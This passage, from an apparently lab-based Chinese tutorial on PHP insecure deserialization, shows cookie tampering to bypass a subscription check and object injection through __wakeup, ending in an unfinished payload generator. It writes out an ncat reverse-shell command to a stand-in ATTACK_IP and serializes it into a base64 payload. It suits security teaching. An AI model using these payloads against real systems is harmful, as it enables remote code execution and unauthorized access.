+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们已经知道，在 PHP 序列化过程中，如果&lt;strong&gt;属性名不是公开&lt;/strong&gt;的，则&lt;strong&gt;类名会作为属性名的前缀&lt;/strong&gt;，以确保唯一性并方便反序列化。这是 PHP 内部处理对象序列化和反序列化的方式之一。当一个对象被序列化时， PHP 会存储该对象的属性和类名。这确保了当对象稍后被反序列化时， PHP 知道要实例化哪个类，以及如何将序列化的数据正确地赋值给对象的属性。让我们将序列化注释分解成各个部分：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;O:5:&amp;ldquo;Notes&amp;rdquo;:3&lt;/strong&gt; ：这表示具有类名 Notes 的对象（O），它具有三个属性。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;s:4:&amp;ldquo;user&amp;rdquo;;s:5:&amp;ldquo;guest&amp;rdquo;&lt;/strong&gt; ：这表示一个长度为 4 个字符的字符串，代表值为“ &lt;strong&gt;guest&lt;/strong&gt; ”的属性 &lt;code&gt;user&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;s:4:&amp;ldquo;role&amp;rdquo;;s:5:&amp;ldquo;guest&amp;rdquo;&lt;/strong&gt; ：与上一个类似，它表示值为“ &lt;strong&gt;guest&lt;/strong&gt; ”的属性 &lt;code&gt;role&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;s:12:&amp;ldquo;isSubscribed&amp;rdquo;;b:0&lt;/strong&gt; ：这表示名为 &lt;code&gt;isSubscribed&lt;/code&gt; 的布尔 (b) 属性，其值为 false (0)。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;利用漏洞-1&#34;&gt;利用漏洞
+&lt;/h3&gt;&lt;p&gt;在当前情况下，当用户想要尝试分享笔记时，他们会看到以下弹出窗口：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424140403414.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424140403414&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;那么后端发生了什么？后端 PHP 代码会验证传入的 Cookie，对其进行反序列化，然后验证用户是否已订阅。我们的主要任务就是绕过这一步。&lt;/p&gt;
+&lt;p&gt;假设攻击者拦截了此序列化的 Cookie 值，并将其 &lt;code&gt;isSubscribed&lt;/code&gt; 属性从 false (0) 修改为 true (1)。攻击者可以通过更改序列化数据中的布尔值，在未经合法授权的情况下操纵订阅状态。&lt;/p&gt;
+&lt;p&gt;修改后，攻击者会再次对序列化数据进行 base64 编码，并用修改后的值替换原始 cookie 值。这将允许攻击者获得未经授权的访问权限，从而绕过预定的订阅限制，在其他平台上共享笔记。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424140743017.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424140743017&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用-对象注入&#34;&gt;漏洞利用-对象注入
+&lt;/h2&gt;&lt;p&gt;对象注入是一种由 Web 应用程序中&lt;strong&gt;不安全的数据反序列&lt;/strong&gt;化引起的漏洞。当不受信任的数据被反序列化为对象时，攻击者可以利用该漏洞操纵序列化数据并执行任意代码，从而造成严重的安全风险。&lt;/p&gt;
+&lt;p&gt;众所周知，该漏洞源于序列化和反序列化过程，该过程允许将 PHP 对象转换为可存储格式（序列化），然后重建为对象（反序列化）。虽然序列化和反序列化对于数据存储和传输非常有用，但如果实施不当，也可能带来安全风险。&lt;/p&gt;
+&lt;p&gt;要利用 PHP 对象注入漏洞，应用程序必须包含一个包含 PHP 魔术方法（例如 &lt;code&gt;__wakeup&lt;/code&gt; 或 &lt;code&gt;__sleep&lt;/code&gt; ）的类，以便攻击者利用这些方法进行恶意攻击。所有涉及攻击的类都应在调用 &lt;code&gt;unserialize()&lt;/code&gt; 方法之前声明（除非支持对象自动加载）。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;让我们考虑一个 &lt;code&gt;index.php&lt;/code&gt; 代码片段，它展示了如何使用 &lt;code&gt;serialize()&lt;/code&gt; 和 &lt;code&gt;unserialize()&lt;/code&gt; 函数进行序列化和反序列化。该代码接受 &lt;strong&gt;GET&lt;/strong&gt; 参数的&lt;strong&gt;解码&lt;/strong&gt;或&lt;strong&gt;编码&lt;/strong&gt; ，并相应地转换用户提供的值。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;UserData&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;..&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;test.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;encode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$userData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;UserData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;encode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$serializedData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$userData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$base64EncodedData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$serializedData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Normal Data: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;encode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Serialized Data: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$serializedData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Base64 Encoded Data: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$base64EncodedData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;decode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$base64EncodedData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;decode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$serializedData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$base64EncodedData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$serializedData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Base64 Encoded Serialized Data: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$base64EncodedData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Serialized Data: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$serializedData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;例如，如果我们通过 URL &lt;a class=&#34;link&#34; href=&#34;http://10.10.183.12/case2/?encode=hellothm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http ://10.10.183.12/case2/?encode=&lt;/a&gt; hellothm 发送输入 &lt;strong&gt;hellothm&lt;/strong&gt; ，我们将得到以下输出：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424141228400.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250424141228400&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们看到代码中包含一个名为 &lt;code&gt;test.php&lt;/code&gt; 的文件。通过查看源代码或考虑该框架是否开源，渗透测试人员知道 &lt;code&gt;test.php&lt;/code&gt; 包含一个名为 &lt;code&gt;MaliciousUserData&lt;/code&gt; 的类，如下所示：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;MaliciousUserData&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// call to troubleshooting server
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在上述代码中，通过不安全的反序列化，攻击者可以操纵对象的属性，包括修改 &lt;code&gt;MaliciousUserData&lt;/code&gt; 类的 &lt;code&gt;command&lt;/code&gt; 属性。这可以通过精心设计一个包含所需属性值的序列化字符串来实现。 例如，如果我们想要修改 &lt;code&gt;command&lt;/code&gt; 属性以执行其他命令或连接到其他服务器，我们可以将一个对象序列化为所需的属性值，然后将其注入到存在漏洞的 &lt;code&gt;unserialize()&lt;/code&gt; 函数中。这样，在反序列化时，被操纵的属性值将被加载到对象中。&lt;/p&gt;
+&lt;p&gt;需要注意的是，在不安全的反序列化过程中，您无法直接更新 &lt;code&gt;__wakeup&lt;/code&gt; 方法本身的定义。__ &lt;code&gt;__wakeup&lt;/code&gt; 方法是类定义的一部分，在反序列化过程中保持静态。但是，您可以在 &lt;code&gt;__wakeup&lt;/code&gt; 方法中修改对象的行为或属性。这意味着，虽然该方法的定义保持不变，但其在反序列化时的操作可以被操纵以实现不同的结果。&lt;/p&gt;
+&lt;h3 id=&#34;准备payload&#34;&gt;准备Payload
+&lt;/h3&gt;&lt;p&gt;如前所述，调用另一个类是 PHP 的常规功能，如果目标网站使用开源代码，您可以查看该文件的代码。&lt;code&gt;index.php&lt;/code&gt; 的代码会盲目地反序列化输入，而不执行任何清理。这里有什么选择呢？如果我们修改 &lt;code&gt;MaliciousUserData&lt;/code&gt; 类并修改其 &lt;code&gt;command&lt;/code&gt; 属性，使得在调用 &lt;code&gt;__wakeup&lt;/code&gt; 函数时，使用攻击者提供的值进行调用，结果会怎样？&lt;/p&gt;
+&lt;p&gt;创建一些 PHP 代码来生成恶意序列化的用户数据。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;MaliciousUserData&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ncat -nv ATTACK_IP 4444 -e /bin/sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$maliciousUserData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;MaliciousUserData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$serializedData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$maliciousUserData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$base64EncodedData&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$serializedData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
